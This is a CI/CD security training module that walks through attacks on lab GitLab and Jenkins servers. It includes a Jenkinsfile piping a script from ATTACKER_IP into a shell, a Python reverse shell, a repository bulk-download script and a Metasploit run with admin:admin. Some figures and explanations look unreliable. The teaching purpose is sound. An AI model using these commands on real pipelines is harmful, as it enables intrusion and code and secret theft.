## CICD and Build Security
### Intro
Welcome to the CI/CD and Build Security network! In this space, we’ll dive into how to keep your DevOps pipeline and the builds it creates safe. It’s important to understand the risks of insecure build processes so that you can see why strong security measures are necessary. We’ll look at common security flaws and how attackers might use them to not only target your pipeline but also disrupt your live systems!

### Pre-Requisites:
- SDLC (Software Development Life Cycle)
- SSDLC (Secure Software Development Life Cycle)
- Intro to Pipeline Automation
- Dependency Management

### Learning Objectives:
- Understand why CI/CD and build system security matter in a DevSecOps pipeline.
- Learn about the risks of having insecure CI/CD pipelines and build processes.
- See why it's important to add strong security to build processes to protect the applications you deploy.
- Explore real-life attacks that can happen if CI/CD pipelines and build processes are misconfigured.

## What is CI/CD and Build Security?
### Introduction

Securing your build environment is essential to protect your software development process from potential threats and vulnerabilities. The SolarWinds supply chain attack, which happened in 2020, showed how important it is to have strong security in place. This task will help you learn how to create a secure build environment, using lessons from the SolarWinds case.

### Fundamentals of CI/CD

Gitlab outlines eight key principles for CI/CD (Continuous Integration/Continuous Delivery) to ensure an efficient and secure build process:

1. **Single source repository** – Use source code management to store all files needed for building your app.
2. **Frequent check-ins to the main branch** – Update code frequently with smaller changes to make integration smoother.
3. **Automated builds** – Automatically trigger builds when code changes are made.
4. **Self-testing builds** – Automatically test the build to check its quality, integrity, and security.
5. **Frequent iterations** – Regular, smaller code commits reduce conflicts and improve efficiency.
6. **Stable testing environments** – Test code in environments similar to production to catch issues early.
7. **Maximum visibility** – Make sure all developers can see the latest code changes and builds.
8. **Predictable deployments** – Ensure deployments can happen anytime with minimal risk to production.

While these principles help streamline the CI/CD process, they don’t focus on security. It’s important to ensure the automation doesn’t increase the risk of attacks or make the pipeline more vulnerable.

### A Typical CI/CD Pipeline

A typical CI/CD pipeline has several key components. Here’s what a basic pipeline looks like:

- **Developer Workstations** – This is where developers write and build code. In this environment, it’s simulated using the AttackBox.
- **Source Code Storage** – A place to store and manage code versions, like the GitLab server in this network.
- **Build Orchestrator** – This manages the automation of the build and deployment process, such as GitLab and Jenkins in this network.
- **Build Agents** – Machines that handle building, testing, and packaging the code. In this network, GitLab runners and Jenkins agents act as build agents.
- **Environments** – These are the stages for building and testing code, such as development (DEV) and production (PROD) environments.

We’ll explore the components of the CI/CD pipeline and common security issues that come with them throughout this course. Keep in mind that pipelines can vary based on the tools used, but the security principles we’ll cover apply universally.

### The SolarWinds Case

The SolarWinds breach, discovered in December 2020, was a major cyberattack. Hackers compromised SolarWinds’ software supply chain by injecting malicious code called **SUNBURST** into updates for its Orion software. This allowed attackers to gain access to the networks of many organizations, including government agencies and private companies.

This breach highlighted the importance of securing the entire software supply chain, including the build environment. We will use this case to guide us through measures to strengthen our build security, such as **isolation**, **segmentation**, and setting up **access controls** to prevent unauthorized access.

### Key Security Measures

#### 1. **Implement Isolation and Segmentation**

The SolarWinds attack showed how crucial it is to isolate and segment important components within the build system. By separating different stages of the build process and enforcing strict access controls, you can reduce the risk of one compromised part affecting the whole system. 

You can achieve isolation using technologies like **containerization** or **virtualization**, which create secure "sandboxes" to run build processes without exposing the entire environment.

#### 2. **Set Up Strong Access Controls and Permissions**

To keep your build environment secure, limit access to only those who absolutely need it. Use the **principle of least privilege**, meaning give access to people only for the tasks they need to do. 

Some important measures include:
- **Multi-Factor Authentication (MFA)** for extra security.
- **Strong password policies** to prevent unauthorized access.
- Regularly review and update access controls.
- Limit the number of people who have administrative (privileged) access and set up strict monitoring and auditing for these accounts.

#### 3. **Network Security**

Securing the network is crucial for protecting the build environment. Here are some key steps to improve network security:
- **Network segmentation** – Divide the build system into different network zones to help contain breaches and limit how attackers can move inside your system.
- **Secure communication** – Ensure that software updates happen over secure channels, and only use trusted sources for third-party dependencies.
- **Monitor suppliers** – Regularly check the security of your software suppliers to identify and fix any risks.

### Conclusion

The SolarWinds incident teaches us how critical it is to secure every part of the build process, from development to deployment. By applying isolation, access controls, and strong network security, we can protect our build environments from potential attacks and ensure the trustworthiness of the software we deliver.

## Creating your own Pipeline
### Introduction

Before we dive into security misconfigurations, let's first set up a basic pipeline to experiment with. This will help us understand the core concepts and structure of a CI/CD pipeline.

### Registering on the GitLab Instance

To get started, we'll create an account on the GitLab server. Go to **http://gitlab.example.local** and select the *Register Now* button. Fill in the necessary details to create your account and complete the registration process. Remember to use a strong password and save it for your work through this network! After logging in, you'll be greeted by the GitLab dashboard.

GitLab is similar to GitHub, but it allows you to host your own instance for more control over your projects.

### Creating a Project

Now that you have an account, it’s time to create a new project. You can create a project from scratch or fork an existing one to experiment with. For the purpose of this exercise, we’ll fork a pre-existing project specifically designed for this task.

1. Go to the *Your Work* tab, then click *Explore*.
2. In the search bar, look for *SimpleBuild*.
3. Select the project and click *Fork*.
4. When prompted, choose your username as the namespace and set the project visibility to *Private*.

Now you have your own copy of the project, ready for customization and experimentation.

### Understanding CI/CD Configuration

In GitLab, project automation is controlled by the `.gitlab-ci.yml` file. This file defines the steps that run automatically when you make a commit to your repository. Understanding this file is crucial for learning how to secure your build pipeline.

#### Stages of CI/CD

In GitLab CI/CD, jobs are organized into stages, which generally consist of *build*, *test*, and *deploy*. You can add more stages as needed. Here’s an example of a simple build job:

```yaml
.gitlab-ci.yml
build-job:
  stage: build
  script:
    - echo "Hello, $CI_COMMITTER_NAME!"
```

- The first line, `build-job`, is the name of the job.
- The `stage` specifies which part of the pipeline the job belongs to (e.g., build, test, or deploy).
- The `script` section contains the commands to be run in that job. In this case, it simply prints a message with the committer's name.

The jobs in each stage run in parallel, so all build jobs will execute at the same time, as will all test and deploy jobs. If a job fails, the pipeline stops, and later stages won’t run. If a job doesn’t specify a stage, it defaults to the *test* stage.

#### Test Jobs

Test jobs ensure that your code works correctly. You might have multiple test jobs to test different parts of your application. Here are two simple test jobs:

```yaml
.gitlab-ci.yml
test-job1:
  stage: test
  script:
    - echo "Running the first test"

test-job2:
  stage: test
  script:
    - echo "Running the second test, which takes longer"
    - sleep 20
```

In this example:
- The first test job runs quickly.
- The second test job takes 20 seconds to complete, simulating a more time-consuming test.

#### Deployment Jobs

In the *deploy* stage, we push the application to the relevant environment after the build and test stages pass. Typically, the *main* branch is the only one that deploys to production, while other branches are deployed to testing environments. Here’s an example of a simple deployment job:

```yaml
.gitlab-ci.yml
deploy-prod:
  stage: deploy
  script:
    - echo "Deploying from branch $CI_COMMIT_REF_NAME"
    - mkdir -p /tmp/deploy/cicd
    - cp src/* /tmp/deploy/cicd/
    - screen -d -m php -S 127.0.0.1:8081 -t /tmp/deploy/cicd/ &
    - echo "Deployment complete! Access the site at http://localhost:8081/"
  environment: production
```

This job:
1. Creates a directory for the app.
2. Copies the application files into the directory.
3. Uses PHP to host the application.
4. Announces that the deployment is complete and provides the URL.

### Runner Registration

In GitLab, runners execute the tasks defined in the CI/CD pipeline. Let’s set up your machine as a runner for the project.

**Note**: Make sure PHP is installed (`sudo apt install php7.2-cli`) before continuing. If you're working on your own machine, ensure you’re comfortable with the runner deploying a web app on your machine. If not, it's best to use a virtual machine like the AttackBox.

1. In GitLab, navigate to *Settings* > *CI/CD*.
2. Expand the *Runners* section.
3. Click on the three dots and select *Show Runner Installation Steps*.

Follow the instructions in the terminal to install and register the runner.

Example terminal command:

```bash
sudo gitlab-runner register --url http://gitlab.example.local/ --registration-token "your-token-here"
```

When prompted, enter the following:
- **GitLab instance URL**: `http://gitlab.example.local/`
- **Registration token**: Your token (provided in the GitLab runner section).
- **Description for the runner**: E.g., `my-runner`
- **Tags**: Leave blank or add tags like `production`.
- **Executor**: Choose `shell`.

Once the runner is registered, you can see it listed in GitLab. Refresh the page to confirm the runner is active.

### Configuring the Runner to Run Untagged Jobs

In GitLab, jobs are often assigned to runners using tags. Since our pipeline doesn’t use tags yet, we’ll configure the runner to execute all jobs, regardless of tags.

1. Go to the *Runners* section in GitLab.
2. Click on the pencil icon next to your runner.
3. Check the option *Run untagged jobs*.

### Testing the Pipeline

Now that the runner is registered and configured, let’s trigger the pipeline by making a change to the code. The simplest way to trigger a build is to update the `README.md` file.

1. Open the `README.md` file in GitLab.
2. Click *Edit*.
3. Make a small change.
4. Click *Commit changes*.

Once you commit the change, the pipeline will start automatically. You can monitor the progress by navigating to the *Pipelines* section in GitLab. Click on the pipeline to see which job is currently running and view the output.

When the pipeline completes, your application will be deployed! You can verify the deployment by visiting **http://127.0.0.1:8081/** in your browser.

### Congratulations!

You’ve successfully created your own CI/CD pipeline and automated the build process! Feel free to explore more by modifying the `.gitlab-ci.yml` file and experimenting with your runner.

**Note**: To stop the website, run `sudo su gitlab-runner` followed by `screen -r` to connect to the session running the website. You can then stop the application by exiting the screen session.

## Securing the Build Source

### Source Code Security

As we discussed in the initial modules on **Pipeline Automation** and **Source Code Security**, securing the source code is a crucial first step to protecting the entire build process. If an attacker compromises the source code repository, they can easily manipulate the build, introducing vulnerabilities or malicious code. Here, we'll focus on the two primary concerns when it comes to securing source code:

1. **Unauthorized Modifications**: This is the more straightforward of the two concerns. We want to ensure that only authorized individuals are able to modify the source code. This involves strict control over who has the permission to push changes to the repository.

2. **Unauthorized Exposure**: This concern is trickier and can be much more damaging. Depending on the application, source code might contain sensitive information that should never be exposed, such as proprietary algorithms or business logic. For example, companies like Microsoft would want to keep the source code for products like Word confidential, as it constitutes valuable intellectual property (IP). If such sensitive code is disclosed, it could be a significant security risk. This problem is more common and can often go unnoticed, especially in large organizations.

---

### Confusion of Responsibilities

One of the common vulnerabilities in large organizations is the **misunderstanding of security boundaries**. It’s easy to assume that securing the perimeter of the network is enough, but this is a misconception. While securing the external boundary of the network is important, internal network access also requires **granular access control** to minimize risks.

Let’s consider a large organization, such as a **financial institution**. Within such an organization, multiple departments and business units work together to maintain various aspects of the bank’s operations. For example, the bank may have several development teams working on different IT projects, with each team using different programming languages, CI/CD pipelines, and build tools. In such cases, it’s common for companies to host their source code internally, as much of it may constitute sensitive intellectual property (IP).

However, mistakes in access management are common. Let’s look at an example of how this can go wrong:

In large organizations, it's not uncommon for **GitLab** (or similar platforms) to have an open registration system. While the GitLab instance might not be exposed to the public internet, it might allow any employee within the internal network to create an account. While this doesn't seem risky at first glance, it drastically increases the organization's **attack surface**. 

For instance, let’s assume a financial institution employs 10,000 people, of whom 2,000 are developers. This means that 2,000 people can potentially access GitLab. If just one of these developers is compromised, an attacker could register a profile and gain access to publicly shared repositories. Now, the attack surface has increased by 500%, making it much easier for an attacker to exfiltrate sensitive code.

Furthermore, many developers might assume that if GitLab is only accessible within the internal network, repositories can safely be set to *public*. This is a common mistake—while these repositories may be protected from external users, anyone with an account on the platform can access them. If the code in these repositories is considered sensitive (e.g., intellectual property), this could lead to exposure of critical business assets. Let's explore how this misconfiguration could be exploited.

---

### Exploiting an Insecure Build Source

In this scenario, you have already registered a profile on the internal GitLab instance. While manual enumeration can sometimes be used to identify repositories containing sensitive data, a more efficient approach is to automate the process. Here’s how you can use a **Python script** and the GitLab API to quickly enumerate publicly accessible repositories:

```python
# enumerator.py
import gitlab
import uuid

# Connect to GitLab
gl = gitlab.Gitlab("http://gitlab.example.local", private_token='your-api-token')
gl.auth()

# Retrieve all GitLab projects
projects = gl.projects.list(all=True)

# Attempt to download each project
for project in projects:
    print("Downloading project: " + str(project.name))
    UID = str(uuid.uuid4())
    print(UID)
    
    try:
        repo_download = project.repository_archive(format='zip')
        with open(str(project.name) + "_" + str(UID) + ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        print("Error with this download")
        print(e)
        pass
```

### Note:
- Ensure you have the **python-gitlab** library installed: 
  ```bash
  pip3 install python-gitlab==3.15.0
  ```

This script is a simple example that uses the GitLab API to download all repositories, but it's not stealthy. It fetches the list of all repositories and attempts to download them without checking whether they are publicly available first. This illustrates how an attacker could quickly access and download repositories that are mistakenly set as public.

To make the process more stealthy, the script could be modified to first determine which repositories are accessible before downloading them.

### API Token Setup
Before running the script, you'll need to generate a GitLab API token. Follow these steps:

1. Go to **Preferences** from your GitLab profile.
2. Click **Access Tokens**.
3. Create a new token with the required permissions (`api`, `read_api`, and `read_repository`).
4. Copy the token to a secure location.
5. Replace the `private_token` in the script with your generated token and execute the script to download the repositories.

Example output:
```bash
[thm]$ python3.9 enumerator.py 
Downloading project: Basic Build
3609db7f-0d07-440c-bdc6-1f78cb283f6a
Downloading project: Mobile App
836fe1fa-0fc2-4917-b1c1-61badef3b711
```

Once you've downloaded all publicly accessible repositories, you can start looking for sensitive information. A good first step is to extract all the repositories and search for common keywords like "secret" or "password" using **grep**.

---

### Securing the Build Source

To secure your build source and prevent these types of vulnerabilities, granular **access control** is essential. Here are a few best practices:

1. **Group-Based Access Control**: GitLab allows you to organize projects into groups, making it easier to manage access across multiple repositories. By setting permissions at the group level, you can ensure consistent security policies are applied. For example, create a group for your development team and restrict access based on roles (e.g., only certain members can view or modify sensitive repositories).

2. **Access Levels**: GitLab offers different access levels, such as **Guest**, **Reporter**, **Developer**, **Maintainer**, and **Owner**. Each level comes with its own set of permissions. Make sure to assign the appropriate level to each user or group based on their role to limit unnecessary access.

3. **Protect Sensitive Information**: It's crucial to prevent sensitive data from being accidentally exposed. GitLab offers several features to help:
   - **.gitignore**: Use this file to specify which files should not be tracked by Git. This is especially useful for ensuring that sensitive data like passwords or API keys don’t end up in the repository.
   - **Environment Variables**: Store sensitive information like API keys or credentials in environment variables rather than hardcoding them into your repositories.
   - **Branch Protection**: Protect key branches (e.g., *main* or *production*) to ensure that changes go through code review and testing before they are merged.

---

### Ongoing Best Practices

Securing the source code and the build process requires ongoing vigilance. Here are some steps you can take to maintain security:

- **Regularly Review Permissions**: As team members join, leave, or change roles, it's essential to update access permissions to ensure that only the right people have the appropriate level of access.
- **Implement Two-Factor Authentication (2FA)**: Use 2FA to provide an additional layer of security for GitLab accounts.
- **Monitor Audit Logs**: Keep track of who accesses or modifies repositories to detect any unusual activity.
- **Scan Repositories**: Regularly scan repositories for sensitive data using automated tools designed for this purpose to identify and fix potential vulnerabilities.


## Securing the Build Process
### Securing the Build Process

Now that we’ve covered how to secure the source code, the next step in securing our pipeline is to ensure the build process itself is free from misconfigurations that could potentially lead to a compromise.

#### Managing Dependencies

One of the first steps in securing the build pipeline is securing the **dependencies** that our source code relies on. When the pipeline runs, it compiles the source code and gathers all external libraries, SDKs, or other dependencies required for the build. These dependencies can present significant security risks, and there are two key concerns:

- **Supply Chain Attacks**: If an attacker gains control over any of the external dependencies, they can inject malicious code into the build.
- **Dependency Confusion**: If there is an internally developed dependency, an attacker may exploit a dependency confusion attack to introduce malicious code into the build process.

These types of attacks are covered in more detail in the **Dependency Management** section. Here, we'll focus on a misconfiguration within the build process itself.

---

#### Knowing When to Start the Build

One of the significant challenges with automated build pipelines is that they often involve **remote code execution**. When a build is triggered, the build server instructs one of the build agents to execute the commands defined in the CI configuration file. While this automation is a great feature, it introduces the risk that, if an attacker can alter the timing or content of the build process, they could leverage this remote execution to compromise systems.

To mitigate this risk, we need to address the following questions:

- **What actions trigger the build process?**
- **Who is authorized to perform these actions?**
- **Where will the build process take place?**

Answering these questions helps identify the potential attack surface of the pipeline. While one misconfiguration may not necessarily lead to a full compromise, toxic combinations can make the pipeline vulnerable. Let's explore each of these areas in more detail.

---

#### What Actions Start the Build Process?

By default, many CI/CD pipelines are configured to trigger a build automatically whenever new code is committed. However, you can make this process more granular by configuring the pipeline to only start builds on specific actions, such as commits to specific branches (e.g., `main`). This configuration can significantly reduce risk by limiting who can trigger the build process.

However, this introduces another consideration: the risk of broken builds. If developers commit directly to branches other than `main`, the pipeline may break, resulting in numerous merges to resolve conflicts. Some teams opt to trigger the build for all branches or on new merge requests to detect potential issues before merging. While this approach helps identify problems earlier, it increases the attack surface since more actions can trigger the build.

Thus, we must ensure that not just any user can initiate the build, particularly for sensitive branches.

---

#### Who Can Start the Build Process?

Once we've determined the actions that can trigger a build, the next step is to define who can execute these actions. For example, in many pipelines, only a small list of users may have permission to approve merges to the `main` branch. However, if we allow other actions to trigger the build, such as opening a merge request or committing to other branches, we need to define which users can perform these actions.

The key here is to limit the ability to trigger the build to a small set of trusted users, while ensuring that merge requests are thoroughly reviewed and executed in a controlled environment.

---

#### Where Will the Build Occur?

Finally, we must decide where the build will run. It’s not necessary to use a single build agent for all tasks. If we want to run builds on other branches, we could register additional build agents in different environments. This approach could help isolate sensitive builds from less sensitive ones.

If multiple actions can trigger the build, we may want to use different build agents to execute them in different environments based on their sensitivity. For example, builds triggered by merge requests could run in an isolated environment to ensure they don’t affect the production pipeline.

---

### A Toxic Combination: On-Merge Builds

One common misconfiguration in CI/CD pipelines is the **On-Merge Build**. Let’s examine a situation where a developer has configured their pipeline to trigger builds on merge requests. This setup is quite common and is available in tools like Jenkins, which often enables it by default.

The problem arises when the **Jenkinsfile**, a CI/CD script executed by Jenkins, is not properly secured. Since Jenkins pulls the source code (including the Jenkinsfile) whenever a merge request is created, an attacker who can modify the code or the Jenkinsfile could potentially trigger the build agent to run malicious code. 

Let’s walk through an example of how an attacker might exploit this misconfiguration.

#### Exploiting a Jenkinsfile to Compromise the Build

To exploit this vulnerability, the attacker can first **fork** the target repository. This creates a copy of the original repository where the attacker can freely modify files. Here’s how they would proceed:

1. **Fork the Repository**: Navigate to the repository and fork it. Set the forked project as private and select the appropriate namespace.
   
2. **Modify the Jenkinsfile**: Once the repository is forked, the attacker can modify the Jenkinsfile to inject malicious commands, such as a reverse shell. The modified Jenkinsfile could look like this:

   ```groovy
   pipeline {
       agent any
       stages {
           stage('build') {
               steps {
                   sh '''
                       curl http://ATTACKER_IP:8080/shell.sh | sh
                   '''
               }
           }
       }
   }
   ```

3. **Create a Reverse Shell**: The attacker creates a `shell.sh` script that will execute a reverse shell when downloaded. The contents of `shell.sh` might look like this:

   ```bash
   /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
   ```

4. **Host the Reverse Shell**: The attacker then hosts this file on their own server using a Python HTTP server:

   ```bash
   python3 -m http.server 8080
   ```

5. **Create a Merge Request**: After modifying the Jenkinsfile, the attacker submits a merge request with the malicious changes. As soon as the merge request is processed, Jenkins will execute the Jenkinsfile, downloading and executing the reverse shell.

6. **Get Shell Access**: The attacker can listen for the reverse shell on a separate terminal:

   ```bash
   nc -lvp 8081
   ```

   After executing these steps, the attacker should see a shell connection in their terminal, indicating that the build process was successfully exploited.

---

### Best Practices for Protecting the Build Process

To prevent these types of attacks, it’s essential to implement best practices throughout the CI/CD pipeline:

1. **Isolation and Containerization**: Use isolated environments (e.g., containers) to run builds, preventing interference and maintaining consistency across different stages.

2. **Least Privilege**: Grant minimal permissions to users and CI/CD tools, ensuring that only trusted individuals have access to sensitive resources.

3. **Secret Management**: Utilize built-in secret management tools provided by the CI/CD platform to securely store and inject sensitive data (e.g., API keys or credentials) into the build process.

4. **Immutable Artifacts**: Store build artifacts in secure, immutable registries to prevent tampering and ensure traceability.

5. **Dependency Scanning**: Integrate dependency scanning tools to automatically detect and address vulnerabilities in third-party libraries and packages.

6. **Pipeline as Code**: Define CI/CD pipelines as code and store them alongside the source code. This enables version control and auditability of pipeline configurations.

7. **Regular Updates**: Ensure that all tools, libraries, and dependencies are regularly updated to address security vulnerabilities.

8. **Logging and Monitoring**: Continuously monitor build logs for suspicious activities and integrate them with centralized security monitoring systems to detect potential threats early.

By following these best practices, we can secure the build process and mitigate the risks posed by remote code execution, supply chain attacks, and other vulnerabilities within the CI/CD pipeline.


## Securing the Build Server

### Securing the Build Infrastructure

After successfully securing the build process, the next priority is safeguarding the **build server** itself. If an attacker gains access to or controls the build server, they can jeopardize the entire pipeline, putting both the build process and the deployment at risk.

---

#### Build Server Security Fundamentals

Before delving into the specifics of potential attacks, let's first discuss how to secure a build server. The simplest starting point is **access control**. One of the most common attack vectors for CI/CD infrastructure is **credential guessing**. Despite modern security awareness, many build servers still use default or weak login credentials, such as `admin:admin` on tools like Jenkins.

To mitigate this risk, **restrict access** to the build server. Often, multiple team members might need access to the same build server, so it’s essential to enforce **granular access control** to limit the blast radius of a compromised user account. Additionally, enabling **multi-factor authentication (MFA)** for user logins adds an extra layer of defense.

---

#### Exposed Build Server Example

Consider a Jenkins server exposed at **http://build-server.example.local:8080**. In real-world scenarios, you may need to modify your `/etc/hosts` file to map the machine’s IP address, as shown in your network diagram. Once updated, accessing the Jenkins UI should allow you to interact with the server. If the server is using default credentials, trying `admin:admin` might provide you with unauthorized access.

For this exercise, we will demonstrate how to use Metasploit to exploit an exposed Jenkins build server. On your attack machine (such as Kali Linux), open Metasploit by entering the following command:

```bash
msfconsole
```

We will be using the **jenkins_script_console** module from Metasploit to exploit the Jenkins server:

```bash
msf6 > use exploit/multi/http/jenkins_script_console
msf6 exploit(multi/http/jenkins_script_console) > show options
```

The output will show available options that need to be configured, like this:

```bash
Module options (exploit/multi/http/jenkins_script_console):
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       Target host(s)
RPORT                       yes       Target port (usually 8080 for Jenkins)
TARGETURI                   yes       Path to Jenkins (e.g., /jenkins/)
USERNAME                    no        Username to authenticate
PASSWORD                    no        Password for authentication
```

To configure the exploit, set the following options:

- **RHOSTS**: Set this to the IP or domain name of your target Jenkins server (e.g., `build-server.example.local`).
- **RPORT**: Set the target port (usually `8080`).
- **USERNAME**: Provide the Jenkins username (e.g., `admin`).
- **PASSWORD**: Provide the corresponding password (e.g., `admin`).

Once these values are set, run the exploit:

```bash
msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS build-server.example.local
msf6 exploit(multi/http/jenkins_script_console) > set RPORT 8080
msf6 exploit(multi/http/jenkins_script_console) > set username admin
msf6 exploit(multi/http/jenkins_script_console) > set password admin
msf6 exploit(multi/http/jenkins_script_console) > run
```

If successful, Metasploit will establish a **Meterpreter session**. You can check the user ID of the Jenkins server:

```bash
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.2.50:8080)
meterpreter > getuid
Server username: admin
```

In addition to using Metasploit, you can **manually exploit** the Jenkins script console by running custom Groovy scripts to gain control over the server.

---

### Steps to Secure the Build Server

To protect both your build server and build agents, implement these key security measures:

1. **Agent Configuration**: Ensure that build agents can only communicate with the build server, not with external networks. This minimizes exposure to external threats.

2. **Private Network**: Isolate the build agents in a **private network** that doesn’t allow direct access from the public internet. This reduces potential attack surfaces.

3. **Firewalls**: Use **firewalls** to block unauthorized access to the build server. Allow only traffic related to the build process (e.g., HTTP or SSH) from trusted IPs.

4. **VPN Access**: Set up a **VPN** to securely access the build server and agents from remote locations, ensuring encryption and preventing direct internet access.

5. **Token-Based Authentication**: For agents communicating with the build server, use **token-based authentication**. This adds a layer of protection beyond traditional username/password methods.

6. **SSH Key Authentication**: For build agents that rely on SSH, ensure that **SSH keys** are used instead of passwords. This provides a more secure method of authentication.

7. **Continuous Monitoring**: Continuously **monitor** activities on both the build server and agents. Set up alerts for unusual behaviors, and review logs regularly to identify suspicious activity.

8. **Timely Updates**: Regularly **update** the build server and agent software to patch known vulnerabilities. Staying on top of security patches reduces the risk of exploitation.

9. **Security Audits**: Conduct **periodic security audits** to identify vulnerabilities within the build infrastructure. Auditing helps uncover potential weaknesses before they are exploited.

10. **Hardening Configuration**: **Harden** your build server by disabling unused services, changing default credentials, and enforcing strict security policies. Always remove any default configurations that might be vulnerable.

---

By implementing these security measures, you can significantly reduce the risk of your build server and its associated infrastructure being compromised. Protecting the build server is critical for maintaining the integrity and security of your entire DevSecOps pipeline.


## Securing the Build Pipeline

With the build server now secured, the next focus is protecting the **CI/CD pipeline** itself. Even when security measures are properly implemented, there remains the risk that a developer may fall victim to an attack, whether through social engineering, credential exposure, or other means. A compromised developer account could put the entire pipeline at risk, allowing unauthorized changes to the code or build process. Thankfully, there are several measures that can be employed to mitigate this threat.


#### Access Gates in the Pipeline

**Access gates** (sometimes referred to as checkpoints or approval gates) are strategic points in the CI/CD pipeline that enforce specific quality and security criteria before code moves to the next stage. They act as "filters" that ensure code changes are only promoted after meeting predefined standards, thus improving both control and security across the development lifecycle. Here’s why they’re important:

1. **Enhanced Control**: Access gates ensure that only code meeting certain conditions can progress to the next stage, enhancing the visibility and control over the pipeline’s flow.
2. **Quality Assurance**: Gates ensure that code is tested and verified against quality metrics before it can advance.
3. **Security Assurance**: These gates can also trigger security scans or vulnerability assessments before deployment, preventing flawed or risky code from reaching production.

##### Implementation of Access Gates:
1. **Manual Approvals**: Require manual sign-offs before advancing to the next stage. This ensures that critical changes are reviewed by another person.
2. **Automated Tests**: Implement gates to trigger automated unit tests, integration tests, and linting processes to ensure code quality.
3. **Security Scans**: Incorporate security scanning tools into your pipeline to identify vulnerabilities before deployment.
4. **Release Gates**: Ensure all code changes meet documentation, versioning, and compliance requirements before deployment.
5. **Environment Validation**: Verify that the target environment is prepared for deployment before pushing changes live.
6. **Rollback Plan**: Add a gate that ensures a rollback plan is in place in case post-deployment issues occur.
7. **Monitoring**: Establish gates for performance monitoring after deployment to ensure code performs as expected.
8. **Parallel Gates**: Run multiple gates in parallel to streamline the process while maintaining quality assurance.
9. **Audits and Reviews**: Regularly review and update the gates to ensure they are effective in preventing issues and protecting the pipeline.


#### Two-Person Rule in Access Gates

Even with **access gates** in place, it’s essential to ensure that no single person has the ability to bypass these gates or approve changes unilaterally. This can be achieved through the **two-person rule**—an approach where no one is allowed to approve their own changes. If a developer submits a change, another team member must approve it before it can progress.

To enforce this control, one method is to **increase the number of required approvals**. For instance, even if a developer initiates a change, a second party must also approve it before the pipeline continues.

In some cases, your CI/CD tool may not provide built-in support for the two-person rule. In these cases, adjusting the configuration to require multiple approvals can be a simple workaround.


### Finalizing the Protection of Our DevSecOps Pipeline

We are almost there! Our pipeline and build process are well-protected, but there’s one last critical step: ensuring that **build secrets** remain secure. With everything else in place, the security of our secrets can make or break the integrity of the entire pipeline.

---

#### The Importance of Securing Secrets

After implementing segregated runners for different environments, Larry has learned an important lesson, but there’s still a lingering issue. While the pipelines may be segmented, it's just as crucial to ensure that the **secrets** (or environment variables, as they’re often called in CI/CD platforms) are properly segmented as well. Without proper segregation, secrets intended for **production** could be mistakenly used in a **development** environment, potentially compromising the entire production environment.

Let’s walk through an example to illustrate how secrets could be exposed in the wrong environment. Consider this repository that we used in the previous exercise: **http://gitlab.example.com/zack/secrets-environment**.

### Example of a Misconfigured Secret:

We can look at the environments and their respective builds, just like we did previously. Upon inspecting one of the **production deployments**, we notice that it uses an `API_SECRET` variable:

However, we don’t have the permissions to list all available variables, but by checking the CI configuration file in the **development** branch, we see a different variable—`API_SECRET_DEV`. This is a clear example of segregating secrets between environments.

Now, let's explore a potential security gap. If we change the CI file in the **development** branch to include the **production** variable, we can attempt to access the production secret. This oversight can lead to a compromise of the production environment, as the build might unknowingly utilize the production secrets.

---

### How to Protect Build Secrets

To maintain a secure CI/CD pipeline, it’s crucial to handle and store **build secrets** securely. CI/CD platforms like **GitLab** offer built-in features to help protect these secrets, ensuring they’re not exposed during the pipeline execution or in logs.

---

#### 1. **Masking Secrets in CI/CD Jobs**

One of the primary ways to secure secrets in GitLab CI/CD pipelines is to **mask variables**. This ensures that sensitive information does not appear in job logs, where it could be exposed to unauthorized users. Here's how to apply masking:

- **Masking Variables**: GitLab allows you to mask any variables you don’t want to be displayed in the job logs using predefined tokens, such as `CI_JOB_TOKEN`.

Here’s an example:

```yaml
my_job:
  script:
    - echo "$MY_SECRET_KEY"  # This will expose the secret
    - echo "masked: $CI_JOB_TOKEN"  # This will mask the secret
```

In the above example, the variable `MY_SECRET_KEY` will be exposed in logs, but `$CI_JOB_TOKEN` will be masked, keeping its value hidden.

#### 2. **Using Secure Variables for Secrets**

For even greater security, you can store sensitive information using **GitLab CI/CD variables** with the **"Masked"** option enabled. These variables are stored securely in the GitLab backend and are never exposed in job logs, even if you reference them directly in your pipeline.

Here’s how to set up secure variables in GitLab:

1. Go to your **GitLab project**.
2. Navigate to **Settings > CI/CD > Variables**.
3. Add a new variable and check the **"Masked"** checkbox. 
4. Provide the value for your secret.

Once a secure variable is created, you can safely reference it in your `.gitlab-ci.yml` file, and GitLab will automatically mask the value during job execution. This means the secret is never exposed, even in job logs.

> **Important Tip**: Even when using masked variables, be careful not to accidentally echo or print sensitive information in your scripts. Always review your scripts to ensure secrets aren’t exposed unintentionally.

#### 3. **Access Control for Secrets**

Limiting access to your build secrets is just as important as securing them. To prevent unauthorized users from accessing your CI/CD secrets or logs, you should enforce strict **access control** policies. GitLab allows you to configure access controls at both the **project level** and the **group level**, ensuring that only authorized users can view job logs and CI/CD variables.

- **Project-level Access Control**: Ensure that only trusted team members can access sensitive information within the project settings.
- **Group-level Access Control**: Extend access control to multiple projects under the same group to prevent unauthorized access across multiple repositories.

### Steps to Configure Access Control:

1. Review and configure access settings for your GitLab project. Navigate to **Settings > Members** to define who can access and modify your variables.
2. Limit access to job logs in your project by adjusting permissions under **Settings > CI/CD > Job Log Permissions**.
3. Ensure that only necessary users have access to the **CI/CD Variables** page and that the **"Masked"** option is enabled for all secrets.

By carefully managing who can view and modify these sensitive variables, you ensure that only those who need access to them can interact with them.

---

### Conclusion

In summary, protecting **build secrets** is a vital part of maintaining a secure DevSecOps pipeline. By using **masked variables**, **secure variables**, and enforcing **access control**, you can ensure that secrets are protected from unauthorized access and exposure, even during build and deployment stages.

By following the steps outlined above, you’ll ensure that your build secrets remain **segregated**, **masked**, and **secure** throughout the CI/CD pipeline, reducing the risk of exposure and maintaining the integrity of your pipeline.


## Conclusion

### Key Insights for Strengthening DevSecOps Security

Reflecting on the vulnerabilities and misconfigurations we've analyzed in previous exercises, we can draw the following conclusions for securing your DevSecOps pipeline:

